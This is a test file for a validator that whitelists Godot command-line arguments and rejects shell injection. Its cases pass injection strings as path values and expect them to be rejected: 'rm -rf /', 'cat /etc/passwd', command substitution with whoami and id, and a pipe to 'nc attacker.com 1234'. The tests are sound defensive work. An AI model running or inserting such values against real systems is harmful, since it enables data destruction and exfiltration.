/**
 * Tests for command argument validation utilities
 */
import { describe, it, expect } from 'vitest';
import {
  validateGodotArguments,
  prepareGodotCommand,
  isArgumentAllowed,
} from '../../src/utils/argument-validator.js';
import { ValidationError } from '../../src/types/errors.js';

describe('Argument Validator', () => {
  describe('validateGodotArguments', () => {
    it('should accept whitelisted arguments', () => {
      const validated = validateGodotArguments(['--version']);
      expect(validated).toEqual(['--version']);
    });

    it('should accept multiple valid arguments', () => {
      const validated = validateGodotArguments(['--editor', '--quit', '--verbose']);
      expect(validated).toEqual(['--editor', '--quit', '--verbose']);
    });

    it('should accept arguments with values', () => {
      const validated = validateGodotArguments(['--path', '/home/user/project']);
      expect(validated).toEqual(['--path', '/home/user/project']);
    });

    it('should accept arguments with = syntax', () => {
      const validated = validateGodotArguments(['--path=/home/user/project']);
      expect(validated).toEqual(['--path=/home/user/project']);
    });

    it('should reject disallowed arguments', () => {
      expect(() => validateGodotArguments(['--malicious'])).toThrow(ValidationError);
      expect(() => validateGodotArguments(['--rm-rf'])).toThrow(ValidationError);
    });

    it('should reject shell metacharacters in values', () => {
      expect(() => validateGodotArguments(['--path', '/path;rm -rf /'])).toThrow(ValidationError);
      expect(() => validateGodotArguments(['--path', '/path|cat /etc/passwd'])).toThrow(ValidationError);
      expect(() => validateGodotArguments(['--path', '/path`whoami`'])).toThrow(ValidationError);
      expect(() => validateGodotArguments(['--path', '/path$(cat /etc/passwd)'])).toThrow(ValidationError);
    });

    it('should reject newlines in values', () => {
      expect(() => validateGodotArguments(['--path', '/path\nrm -rf'])).toThrow(ValidationError);
      expect(() => validateGodotArguments(['--path', '/path\r\nmalicious'])).toThrow(ValidationError);
    });

    it('should reject null bytes in values', () => {
      expect(() => validateGodotArguments(['--path', '/path\0malicious'])).toThrow(ValidationError);
    });

    it('should reject values starting with dash', () => {
      expect(() => validateGodotArguments(['--path', '-malicious'])).toThrow(ValidationError);
    });

    it('should reject empty arguments', () => {
      expect(() => validateGodotArguments([''])).toThrow(ValidationError);
    });

    it('should require values for value-requiring arguments', () => {
      expect(() => validateGodotArguments(['--path'])).toThrow(ValidationError);
      expect(() => validateGodotArguments(['--resolution'])).toThrow(ValidationError);
    });

    it('should validate resolution format', () => {
      validateGodotArguments(['--resolution', '1920x1080']);
      
      expect(() => validateGodotArguments(['--resolution', 'invalid'])).toThrow(ValidationError);
      expect(() => validateGodotArguments(['--resolution', '1920'])).toThrow(ValidationError);
    });

    it('should validate position format', () => {
      validateGodotArguments(['--position', '100,200']);
      
      expect(() => validateGodotArguments(['--position', 'invalid'])).toThrow(ValidationError);
      expect(() => validateGodotArguments(['--position', '100'])).toThrow(ValidationError);
    });

    it('should validate numeric arguments', () => {
      validateGodotArguments(['--screen', '0']);
      validateGodotArguments(['--fixed-fps', '60']);
      validateGodotArguments(['--time-scale', '2.5']);
      
      expect(() => validateGodotArguments(['--screen', 'abc'])).toThrow(ValidationError);
      expect(() => validateGodotArguments(['--fixed-fps', 'invalid'])).toThrow(ValidationError);
    });

    it('should handle complex valid command lines', () => {
      const args = [
        '--editor',
        '--path', '/home/user/godot/project',
        '--resolution', '1920x1080',
        '--verbose',
        '--debug',
      ];
      const validated = validateGodotArguments(args);
      expect(validated).toEqual(args);
    });

    it('should handle mixed syntax (= and space)', () => {
      const args = [
        '--path=/home/user/project',
        '--resolution', '1920x1080',
        '--editor',
      ];
      const validated = validateGodotArguments(args);
      // --path=/home/user/project (1) + --resolution (2) + 1920x1080 (3) + --editor (4) = 4 items
      expect(validated.length).toBe(4);
    });
  });

  describe('prepareGodotCommand', () => {
    it('should prepare command with validated arguments', () => {
      const result = prepareGodotCommand('/usr/bin/godot', ['--version']);
      expect(result.command).toBe('/usr/bin/godot');
      expect(result.args).toEqual(['--version']);
    });

    it('should throw on invalid arguments', () => {
      expect(() => prepareGodotCommand('/usr/bin/godot', ['--malicious'])).toThrow(ValidationError);
    });
  });

  describe('isArgumentAllowed', () => {
    it('should return true for whitelisted arguments', () => {
      expect(isArgumentAllowed('--version')).toBe(true);
      expect(isArgumentAllowed('--editor')).toBe(true);
      expect(isArgumentAllowed('--path')).toBe(true);
    });

    it('should return false for non-whitelisted arguments', () => {
      expect(isArgumentAllowed('--malicious')).toBe(false);
      expect(isArgumentAllowed('--rm-rf')).toBe(false);
    });

    it('should handle = syntax', () => {
      expect(isArgumentAllowed('--path=/some/path')).toBe(true);
      expect(isArgumentAllowed('--malicious=value')).toBe(false);
    });
  });

  describe('Security Edge Cases', () => {
    it('should prevent command injection via semicolon', () => {
      expect(() => validateGodotArguments(['--path', '/path;cat /etc/passwd'])).toThrow();
    });

    it('should prevent command substation', () => {
      expect(() => validateGodotArguments(['--path', '/path$(whoami)'])).toThrow();
      expect(() => validateGodotArguments(['--path', '/path`id`'])).toThrow();
    });

    it('should prevent pipe injection', () => {
      expect(() => validateGodotArguments(['--path', '/path|nc attacker.com 1234'])).toThrow();
    });

    it('should prevent argument injection', () => {
      expect(() => validateGodotArguments(['--path', '--another-arg'])).toThrow();
    });

    it('should prevent newline injection', () => {
      expect(() => validateGodotArguments(['--path', '/path\n--editor'])).toThrow();
    });
  });
});
